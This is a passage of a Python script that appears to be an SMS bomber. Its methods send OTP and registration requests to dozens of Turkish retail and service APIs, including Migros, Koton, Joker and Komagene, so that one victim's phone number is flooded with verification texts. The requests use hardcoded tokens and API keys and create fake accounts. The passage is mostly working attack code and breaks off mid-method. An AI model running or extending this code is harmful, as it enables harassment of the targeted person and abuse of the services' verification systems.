            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
            self.adet += 1

    # macrocenter.com.tr
    ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£fasdasdasfasf
    ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£gasdgasdeg
    ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£adgasdgasdfasd
    ######$>£æ$>£$>£>£#>£½>£#$>£½>£#$>£
    def Macro(self):
        try:
            url = "https://rest.macrocenter.com.tr:443/users/login/otp"
            ##aksfdj alksfjalkwsfa
            headers = {"Content-Type": "application/json", "X-Device-Platform": "IOS",
                       "X-Request-Identifier": "2C1B6BBB-3E1E-4E7E-9CAE-990C6EAAD279", "Accept": "*/*",
                       "X-Device-Model": "iPhone 7 Plus", "X-Store-Ids": "", "X-Device-Version": "2.3.7",
                       "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "X-Device-Platform-Version": "15.7.7",
                       "User-Agent": "Macrocenter/15 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "X-Device-Identifier": "C7CF9525-9BEB-47B0-87EF-FAFA9F778C3E", "X-Device-Latitude": "",
                       "X-Device-Longitude": "", "X-Device-Type": "MOBILE"}
            json = {"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.macrocenter.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.macrocenter.com.tr")

    def Mopas(self):
        try:
            cookies = {"JSESSIONID": "6817377124C666AA59F3E6B0678F124C"}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
                       "Accept": "text/plain, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
                       "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Dnt": "1",
                       "Referer": "https://mopas.com.tr/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                       "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=",
                             cookies=cookies, headers=headers)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")

    # tiklagelsin.com
    def TiklaGelsin(self):
        try:
            ##aksjdfklasjflkasf
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*",
                       "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "X-Device-Type": "2"}
            json = {"operationName": "GENERATE_OTP",
                    "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
                    "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
                                  "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB",
                                  "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")

    # ayyildiz.com.tr
    def Ayyildiz(self):
        try:
            url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
            headers = {"Accept": "*/*",
                       "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS",
                       "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7",
                       "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
            r = requests.post(url, headers=headers)
            if r.json()["Success"] == True:
                print(
                    f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")

    # naosstars.com
    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
                       "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios",
                       "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC",
                       "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul",
                       "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180",
                       "Accept": "application/json", "Content-Type": "application/json; charset=utf-8",
                       "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
            json = {"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")

    # istegelsin.com
    def Istegelsin(self):
        try:
            url = "https://prod.fasapi.net:443/"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "App-Version": "2528",
                       "Accept-Encoding": "gzip, deflate", "Platform": "IOS",
                       "User-Agent": "ig-sonkullanici-ios/161 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "Accept-Language": "en-US,en;q=0.9"}
            json = {"operationName": "SendOtp2",
                    "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}",
                    "variables": {"phoneNumber": f"90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["sendOtp2"]["alreadySent"] == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net")

    # koton.com
    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {
                "Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk",
                "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*",
                "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest",
                "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate",
                "X-App-Device": "ios", "Referer": "https://www.koton.com/",
                "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")

    # hayatsu.com.tr
    def Hayatsu(self):
        try:
            url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
            headers = {"Content-Type": "application/json", "Cls-Requestid": "915905131", "Accept": "*/*",
                       "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "Password": "ag212i52fUkOwyc1Z234adHs!52yXT4w787qq2*=112tay", "Username": "Nxm1ZHs!",
                       "User-Agent": "HayatSu/1.0.26 (com.hayatsu; build:4.0; iOS 15.7.7) Alamofire/1.0.26",
                       "Connection": "close"}
            json = {"mobilePhoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["IsSuccessful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hayatsu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hayatsu.com.tr")

    # pisir.com
    def Pisir(self):
        try:
            url = "https://api.pisir.com:443/v1/login/"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded",
                       "User-Agent": "Pisir/386 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json = {"app_build": "386", "app_platform": "ios", "msisdn": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["ok"] == "1":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com")

    # hizliecza.com.tr
    def Hizliecza(self):
        try:
            url = "https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json",
                       "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "hizliecza/12 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "Accept-Language": "en-US,en;q=0.9", "Authorization": "Bearer null"}
            json = {"otpOperationType": 2, "phoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["isSuccess"] == True:
                print(
                    f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hizlieczaprodapi.hizliecza.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hizlieczaprodapi.hizliecza.net")

    # ipragaz.com.tr
    def Ipragaz(self):
        try:
            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            headers = {"Content-Type": "application/json", "X-Api-Token": "", "Authorization": "",
                       "App-Version": "1.3.9", "App-Lang": "en", "Accept": "*/*", "App-Name": "ipragaz-mobile",
                       "Os": "ios", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4",
                       "App-Build": "41", "Os-Version": "15.7.7", "Udid": "73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8",
                       "Connection": "close"}
            json = {"birthDate": "2/7/2000", "carPlate": "31 ABC 31",
                    "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63",
                    "name": "Memati Bas", "otp": "", "phoneNumber": self.phone, "playerId": ""}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")

    # metro-tr.com
    def Metro(self):
        try:
            url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8",
                       "Accept-Encoding": "gzip, deflate", "Applicationversion": "2.1.1", "Applicationplatform": "2",
                       "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1",
                       "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Connection": "close"}
            json = {"methodType": "2", "mobilePhoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> feature.metro-tr.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> feature.metro-tr.com")

    # kumport.com.tr
    def Kumport(self):
        try:
            url = f"https://online.kumport.com.tr:443/Api/Client/CallApi?action=kumport/User/SendSmsCodeToUser?phoneNumber={self.phone}_AND_ip="
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
                       "Accept": "application/json, text/plain, */*",
                       "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
                       "X-Xsrf-Token": "dLW-gyiEuXVAX42kxdgccFjrCuCklM_ZqvwfzTtUEinJ5QA_54MJ4jI71JG_YzEgzNWtKtRuIB9OmCWiz4QKvTlO-FDTsPwS2tYpG4AxPno1",
                       "Dnt": "1", "Referer": "https://online.kumport.com.tr/", "Sec-Fetch-Dest": "empty",
                       "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers",
                       "Connection": "close"}
            r = requests.get(url, headers=headers, verify=False)
            if r.text.replace("\"", "").split(",")[1].split(":")[1].lower() == "true":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> online.kumport.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> online.kumport.com.tr")

    # qumpara.com
    def Qumpara(self):
        try:
            url = "https://tr-api.fisicek.com:443/v1.3/auth/getOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json",
                       "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "qumpara/4.2.53 (iPhone; iOS 15.7.7; Scale/3.00)",
                       "Accept-Language": "en-TR;q=1, tr-TR;q=0.9"}
            json = {"msisdn": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tr-api.fisicek.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tr-api.fisicek.com")

    # paybol.com.tr
    def Paybol(self):
        try:
            url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms"
            headers = {"Accept": "application/json", "Content-Type": "application/json",
                       "User-Agent": "Paybol/1.2.1 (com.app.paybol; build:1; iOS 15.7.7) Alamofire/5.5.0",
                       "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "Connection": "close"}
            json = {"phone_number": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"] == 0:
                print(
                    f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pyb-mobileapi.walletgate.io")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pyb-mobileapi.walletgate.io")

    # migros.com.tr
    def Migros(self):
        try:
            url = "https://rest.migros.com.tr:443/hemen/users/login/otp"
            headers = {"Content-Type": "application/json", "X-Device-Platform": "IOS",
                       "X-Request-Identifier": "6059F027-F6BC-41A9-93E6-77FB388DA19B", "Accept": "*/*",
                       "X-Device-Model": "iPhone 7 Plus", "X-Store-Ids": "", "X-Device-Version": "10.5.2",
                       "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "X-Device-Platform-Version": "15.7.7",
                       "User-Agent": "Migros/1690 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "X-Device-Identifier": "DA391FD6-7299-4A4E-A35E-1D3090547582", "X-Device-Latitude": "",
                       "X-Device-Longitude": "", "X-Device-Type": "MOBILE"}
            json = {"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")

    # file.com.tr
    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json",
                       "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS",
                       "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json = {"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")

    # roombadi.com
    def Roombadi(self):
        try:
            url = "https://api.roombadi.com:443/api/v2/auth/otp/authenticate"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
                       "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "Roombadi/3 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en,tr"}
            json = {"countryId": 2, "phone": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["remainingTime"] == 120:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.roombadi.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.roombadi.com")

    # goyakit.com.tr
    def Go(self):
        try:
            url = "https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/j94s-g59"
            headers = {"Content-Type": "application/json", "Accept": "*/*", "Authorization": "",
                       "Accept-Encoding": "gzip, deflate", "If-None-Match": "W/\"4b-9bVK1LO7orYixoRsCqyRdMP1T9s\"",
                       "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9",
                       "Surftoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VJZCI6IjRGN0VCNUZDLTNEMUMtNEUzRS05MEZCLUIxMzk3QzExOTgyQiIsImlhdCI6MTY5MDcxNTY3MywiZXhwIjoxNjkzMzA3NjczfQ.2ZQVCog6P-lcMR8XVYzWGeLkTKAQHHbCbnphjgzYI2C",
                       "User-Agent": "ipragazgo/2.2.7 (com.ipraenerji.go; build:1; iOS 15.7.7) Alamofire/5.7.1",
                       "Refreshtoken": "", "Connection": "close"}
            json = {"isRegistered": False, "phone": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr")

    # joker.com.tr
    def Joker(self):
        try:
            url = "https://api.joker.com.tr:443/api/register"
            headers = {"Accept": "*/*", "Content-Type": "application/json",
                       "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTA3MTY1MjEsImV4cCI6MTY5NTkwMDUyMSwidXNlcm5hbWUiOiJHVUVTVDE2OTA3MTY1MjEzMzA3MzdAam9rZXIuY29tLnRyIiwiZ3Vlc3QiOnRydWV9.TaQA8ZDtmU09eFqOFATS8ubXM4BHPQL_BcgeEoqZfuNZcfjfL_xzqRO7fZehzWzEdjHXNXeCUTdjx76EyVB-b3TFuL3OahmrbeaOICD8MXchhMDv78TFhWzOJ9Ad-Mma6QPScSSVL0pYoQHWRhzaeOkmVeypqYiQKGmOEk9NzfOVxDYPa25iJmetiab1Z_b95Hqt5Cls52V7g4pGWmbjYB3gyeUQn5II6neKN174txp1yaGdrNPYwAk_aRJzoAMA1SisZm4rhjdE_9MeyGwjbgk2obPxEVcwvPPwkd56_a34aDOeo6rAvngGALBPWlS89nfHFb6PU2fKyK7jTaVlC0DiVnojlkC_KzoHcptM7SjQBym4Bn9CXZ4kj2J1Om-dhDymQynSCfmQ3JZQd7n1YdQYYMuAoTbjghZhyPu2SCtlI7ao6JhUUcmtO3fjIiyYgAdgD-FDcqSGAs9i5fn3kCidSku5M4ljq1ovJM4BeaNeQdFXqE_WqurpOeLA95fNumGCoXvJGlLhS5VzMdFT-l3cfdPt0V0WmtjJDRpTnosjgfizx4F5qftlVuF98uoFoexg7lQYHyZ-j455-d5B24_WfU8GCjQhtlDVtSTcMiRvUKEjJ-Glm5syv5VVbR7mJxu64SB2J2dPbHcIk6BQuFYXIJklN7GXxDa8mSnEZds",
                       "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "Joker/4.0.14 (com.joker.app; build:2; iOS 15.7.7) Alamofire/5.4.3",
                       "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Connection": "close"}
            json = {"firstName": "Memati", "gender": "m", "iosVersion": "4.0.2", "lastName": "Bas", "os": "IOS",
                    "password": "31ABC..abc31", "phoneNumber": f"0{self.phone}", "username": self.mail}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["message"] == "Doğrulama kodu gönderildi.":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.joker.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.joker.com.tr")

    # ak-asya.com.tr
    def Akasya(self):
        try:
            url = "https://akasya-admin.poilabs.com/v1/tr/sms"
            json = {"phone": self.phone}
            headers = {"x-platform-token": "313131"}
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["result"] == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasya-admin.poilabs.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasya-admin.poilabs.com")

    # akbati.com
    def Akbati(self):
        try:
            url = "https://akbati-admin.poilabs.com/v1/tr/sms"
            json = {"phone": self.phone}
            headers = {"x-platform-token": "313131"}
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["result"] == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbati-admin.poilabs.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akbati-admin.poilabs.com")

    # clickmelive.com
    def Clickme(self):
        try:
            url = "https://dev-azure-mobile-api.clickmelive.com:443/api/v1/authorization/code"
            headers = {"Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc",
                       "Client-Version": "1.0.44", "Client-Device": "IOS", "Accept-Language": "en-US,en;q=0.9",
                       "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "ClickMeLive/85 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
            json = {"phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers)
            if r.json()["isSuccess"] == True:
                print(
                    f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> dev-azure-mobile-api.clickmelive.com")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> dev-azure-mobile-api.clickmelive.com")

    # happy.com.tr
    def Happy(self):
        try:
            url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                       "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest",
                       "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "Origin": "https://www.happy.com.tr",
                       "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
                       "Referer": "https://www.happy.com.tr/index.php?route=account/register"}
            data = {"telephone": self.phone}
            r = requests.post(url=url, data=data, headers=headers)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> happy.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> happy.com.tr")

    # komagene.com.tr
    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            json = {"Telefon": self.phone, "FirmaId": "32"}
            headers = {
                "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com.tr")
                self.adet += 1
            else:
                raise
        except:
